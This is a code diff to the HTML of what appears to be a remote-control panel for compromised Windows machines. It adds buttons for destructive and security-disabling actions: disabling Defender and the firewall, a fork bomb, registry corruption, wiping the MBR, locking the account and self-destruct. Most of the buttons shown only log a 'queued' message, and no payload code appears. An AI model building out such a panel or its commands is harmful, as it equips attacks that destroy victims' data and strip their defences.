@@ -252,34 +252,39 @@
                                         <button onclick="termLog('Command queued: TTS Voice Message')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-cyan-400/50 p-1.5 rounded text-center transition-colors group">
                                             <i class="fa-solid fa-microphone text-cyan-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">TTS Message</h4>
                                         </button>
-                                        <!-- Block Input -->
-                                        <button onclick="termLog('Command queued: Block User Input')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-red-400/50 p-1.5 rounded text-center transition-colors group">
-                                            <i class="fa-solid fa-keyboard text-red-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Block Input</h4>
-                                        </button>
-                                        <!-- Turn off Monitor -->
-                                        <button onclick="termLog('Command queued: Turn Off Display')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-gray-500/50 p-1.5 rounded text-center transition-colors group">
-                                            <i class="fa-solid fa-display text-gray-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Power Off Mon</h4>
-                                        </button>
-                                        <!-- Wallpaper -->
-                                        <button onclick="termLog('Command queued: Change Wallpaper')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-fuchsia-400/50 p-1.5 rounded text-center transition-colors group">
-                                            <i class="fa-solid fa-image text-fuchsia-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Wallpaper</h4>
-                                        </button>
-                                        <!-- Random Tabs -->
-                                        <button onclick="termLog('Command queued: Open Random Tabs')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-teal-400/50 p-1.5 rounded text-center transition-colors group">
-                                            <i class="fa-solid fa-window-restore text-teal-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Random Tabs</h4>
-                                        </button>
                                     </div>
                                 </div>
                                 
-                                <!-- Scorched Earth Section -->
+                                <!-- Powerful Section -->
                                 <div>
-                                    <h3 class="text-[9px] font-bold text-red-500 uppercase mb-2 tracking-wider pl-1 border-b border-red-900/50 pb-1"><i class="fa-solid fa-fire mr-1"></i> Scorched Earth</h3>
+                                    <h3 class="text-[9px] font-bold text-red-500 uppercase mb-2 tracking-wider pl-1 border-b border-red-900/50 pb-1"><i class="fa-solid fa-skull mr-1"></i> Powerful</h3>
                                     <div class="grid grid-cols-2 gap-1.5">
-                                        <button onclick="termLog('Command queued: System Restart')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-red-500/50 p-1.5 rounded text-center transition-colors group">
+                                        <button onclick="termLog('Command queued: System Restart')" class="bg-[#1a2235] hover:bg-red-900/40 border border-gray-800 hover:border-red-500/80 p-1.5 rounded text-center transition-colors group">
                                             <i class="fa-solid fa-power-off text-red-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">REBOOT PC</h4>
                                         </button>
-                                        <button onclick="triggerBSOD()" class="bg-orange-900/30 hover:bg-orange-900/60 border border-orange-900 hover:border-orange-500 p-1.5 rounded text-center transition-colors group">
-                                            <i class="fa-solid fa-biohazard text-orange-500 group-hover:text-white mb-1"></i><h4 class="text-[9px] text-orange-400 group-hover:text-white font-bold">TRIGGER BSOD</h4>
+                                        <button onclick="triggerBSOD()" class="bg-[#1a2235] hover:bg-orange-900/40 border border-gray-800 hover:border-orange-500/80 p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-biohazard text-orange-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">TRIGGER BSOD</h4>
+                                        </button>
+                                        <button onclick="triggerScorchedEarth()" class="bg-[#1a2235] hover:bg-red-900/50 border border-gray-800 hover:border-red-500 shadow-[0_0_10px_rgba(255,0,0,0.1)] p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-burst text-red-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">SELF DESTRUCT</h4>
+                                        </button>
+                                        <button onclick="termLog('Command queued: Disable Defender/Antivirus')" class="bg-[#1a2235] hover:bg-yellow-900/40 border border-gray-800 hover:border-yellow-600/80 p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-shield-virus text-yellow-600 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">DROP DEFENDER</h4>
+                                        </button>
+                                        <button onclick="termLog('Command queued: Execute Fork Bomb')" class="bg-[#1a2235] hover:bg-purple-900/40 border border-gray-800 hover:border-purple-500/80 p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-bomb text-purple-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">FORK BOMB</h4>
+                                        </button>
+                                        <button onclick="termLog('Command queued: Corrupt Windows Registry')" class="bg-[#1a2235] hover:bg-amber-900/40 border border-gray-800 hover:border-amber-500/80 p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-gears text-amber-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">NUKE REGISTRY</h4>
+                                        </button>
+                                        <button onclick="termLog('Command queued: Lock User Account')" class="bg-[#1a2235] hover:bg-rose-900/40 border border-gray-800 hover:border-rose-500/80 p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-user-lock text-rose-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">LOCK ACCOUNT</h4>
+                                        </button>
+                                        <button onclick="termLog('Command queued: Overwrite Master Boot Record')" class="bg-[#1a2235] hover:bg-stone-800/40 border border-gray-800 hover:border-stone-400/80 p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-hard-drive text-stone-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">WIPE MBR</h4>
+                                        </button>
+                                        <button onclick="termLog('Command queued: Disable Windows Firewall')" class="bg-[#1a2235] hover:bg-red-900/30 border border-gray-800 hover:border-red-400/80 p-1.5 rounded text-center transition-colors group">
+                                            <i class="fa-solid fa-fire-extinguisher text-red-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">DROP FIREWALL</h4>
                                         </button>
                                     </div>
                                 </div>
@@ -336,6 +341,6 @@
         <span id="toastMsg" class="font-mono text-sm">Action successful!</span>
     </div>
 
-    <script src="app.js?version=6000"></script>
+    <script src="app.js?version=7000"></script>
 </body>
 </html>
